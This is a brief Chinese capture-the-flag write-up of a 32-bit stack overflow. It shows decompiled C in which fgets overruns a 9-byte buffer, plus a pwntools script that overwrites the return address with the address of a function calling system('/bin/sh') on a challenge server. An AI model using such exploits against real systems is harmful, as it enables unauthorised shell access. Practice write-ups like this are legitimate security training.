main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("stack happy!");
  puts("32bits\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

pwnme函数：

```c
int pwnme()
{
  char s; // [esp+Fh] [ebp-9h]

  fgets(&s, 50, stdin);
  return 0;
}
```

stack函数：

```c
int stack()
{
  return system("/bin/sh");
}
```

分析可知，pwnme函数中fgets存在栈溢出漏洞，s占9个字符，加上下面4个字符。

![image-20210820142522698](images\image-20210820142522698.png)

```python
from pwn import *

context.log_level = 'debug'

sh = remote('pwn.challenge.ctf.show', 28119)
sh.recvuntil('\n')
payload = b'a'*13 + p32(0x0804850F)
sh.send(payload)
sh.interactive()
```

得到flag。